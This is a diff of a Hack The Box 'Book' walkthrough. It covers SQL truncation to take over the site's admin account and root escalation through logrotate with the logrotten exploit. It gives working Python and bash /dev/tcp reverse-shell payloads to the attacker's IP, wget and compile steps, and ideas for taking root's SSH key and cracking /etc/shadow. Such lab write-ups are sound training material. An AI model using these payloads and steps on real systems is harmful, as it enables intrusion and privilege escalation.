@@ -21,8 +21,8 @@ Writeup: 11 July 2020
 **4- [Privilege Escalation](https://github.com/flast101/HTB-writeups/tree/master/book#4--privilege-escalation)**      
 4.1- [Post-Compromise Enumeration](https://github.com/flast101/HTB-writeups/tree/master/book#41--post-compromise-enumeration)    
 4.2- [Deeper Investigation](https://github.com/flast101/HTB-writeups/tree/master/book#42--deeper-investigation)    
-4.3- [Post-Compromise Exploitation](https://github.com/flast101/HTB-book/tree/master/servmon#43--post-compromise-exploitation)         
-
+4.3- [Post-Compromise Exploitation](https://github.com/flast101/HTB-book/tree/master/book#43--post-compromise-exploitation)           
+4.4- [Reverse Shell Stabilization](https://github.com/flast101/HTB-book/tree/master/book#44--reverse-shell-stabilization)
 
 * * *
 ## 2- Enumeration
@@ -73,7 +73,7 @@ Let's have a look on the web site hosted there.
 
 Before visiting the web site, we run Burp Suite in order to register the web traffic.
 
-Going to the url http://10.10.10.176, we arrive on the following sign in/sign up page.
+Going to the url [http://10.10.10.176](http://10.10.10.176), we arrive on the following sign in/sign up page.
 
 ![signin](images/signin.png "signin")
 
@@ -177,7 +177,10 @@ As we know from the contact page that there is an account “admin@book.htb”, 
 
 Now, we can try again but this time we add space char to the e-mail and try to exploit the size limitation.   
 
-The email is limited to 20 characters. We may try to register an account beginning with “admin@book.htb”, then adding spaces until the 20th caharcater, and finally one more character, eg. "1".   
+I didn't know much about this when I rooted the machine and when I first wrote this walkthrough, but it seems that trailing spaces are ignored during database operations. This means that the usernames "admin " and "admin" are identical from a MySQL perspective. You may find more informations the [MySQL documentation](https://dev.mysql.com/doc/refman/8.0/en/char.html). This is known as **"SQL Truncation"**.
+If the backend DBMS is MySQL, which is usually the case here, we should be able to leverage this attack to sign-up as admin@book.htb. Send another request from the sign up form and intercept it.
+
+The email is limited to 20 characters. We may try to register an account beginning with “admin@book.htb”, then adding spaces until the 20th character, and finally one more character, e.g. "1".   
 Doing so, we may obtain another admin account that the site will consider as being the admin account “admin@book.htb” without flagging it during the registration as alreading existing.    
 Let's give it a try.   
 
@@ -189,7 +192,7 @@ From Burp, we create an account “admin” with the email address **“admin@bo
 ![burp](images/burp.png "burp")
 
 
-Now, let's try to login to the admin panel on http://10.10.10.176/admin/index.php. It may not work the first time, but if we register once again, it works !
+Now, let's try to login to the admin panel on [http://10.10.10.176/admin/index.php](http://10.10.10.176/admin/index.php). It may not work the first time, but if we register once again, it works !
 
 ![library-admin](images/library-admin.png "library-admin")
 
@@ -531,36 +534,58 @@ include /etc/logrotate.d
 Actually, we already knew that it is “create” because we saw the files in our home directory, but it is better to check.
 
 Now, we have to prepare a payload file. We edit a payload file `reader@book:~$ nano payload` and write the following classic Python reverse shell code as its content:
-
 ~~~
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ~~~
 
+Another usual code for our payload is :
 
-Now, we download the exploit on the target, compile it, and then run it:
 ~~~
-reader@book:~$ ./logrotten -p ./payload /home/reader/backups/access.log
+bash -i >& /dev/tcp/10.10.14.18/4444 0>&1
+bash -i >& /dev/tcp/10.10.14.17/666 0>&1
+~~~
+
+Of course we save it and make it executable. Now, we download the exploit on the target and compile it with `$ gcc logrotten.c -o logrotten` and make it executable:
+
+~~~
+reader@book:~$ wget http://10.10.14.18/logrotten.c
+reader@book:~$ gcc logrotten.c -o logrotten
+reader@book:~$ chmod +x payload logrotten
+~~~
+
+On our Kali machine we set up a listener with `root@kali:~# nc -nlvp 4444` before we run the exploit.
+
+At the same time we run it, we want the log rotate to trigger our exploit. After testing, wa can notice that there is _**access.log**_ file, and we know that each minute it is backed up and replace by a new and empty file. We actually just want the _**access.log**_ file to not be empty. A way to do this is to generate and write anough random data in the log file _**access.log**_. Another way is **`cp backups/access.log.1 backups/access.log`**.
+
+Let's try it: 
+
+~~~
+head -c 10M < /dev/urandom > backups/access.log; ./logrotten -p ./payload /home/reader/backups/access.log; ls /etc/bash_completion.d/;
 Waiting for rotating /home/reader/backups/access.log...
 Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
 Waiting 1 seconds before writing payload...
 Done!
+access.log  access.log-2020071415.backup  apport_completion  cloud-init  git-prompt  grub
 ~~~
-
-
-
-On our Kali machine we set up a listener with `root@kali:~# nc -nlvp 4444`
 
 It takes several trials before it works and the shell is unstable but it finally works.
 
-
-
 ![root-txt](images/root-txt.png "root-txt")
 
-We can also attempt to cat the shadow file to further decrypt root creds:
 
+### 4.4- Reverse Shell Stabilization
 
-![shadow](images/shadow.png "shadow")
+We got _**root.txt**_ but our reverse shell is dying. We may want to get a stable reverse shell. The most efficient solution here is to migrate the process on which the shell is running. We could do this by starting another reverse shell from the brief root shell we have, but after some tests, a simple `# bash -i` is enough: 
 
+![bash-i](images/bash-i.png "bash-i")
+
+There is another solution which personally I don't like very much. Now that we are root, we can see that there is a _**.ssh/**_ directory in _**/root**_. So, it means that using **`logrotten`**, we could modify this directory, cat or copy the SSH private key /root/.shh/id-rsa to SSH as root user.
+
+What I dont like whit this solution is that there could not be a _**.ssh**_ directory with a ssh private key here. This solution won't work in such a case.
+
+The last solution would be to **`cat /etc/shadow`** to get the root password hash and then try to crack it with **`hashcat`**. I didn't try it but the hash is sha512crypt (**`hashcat -m 1800`**), so you might need a shit load of luck if the password is not weak...
+
+Happy Hacking ! 
 
 
 Happy Hacking ! :smiley:
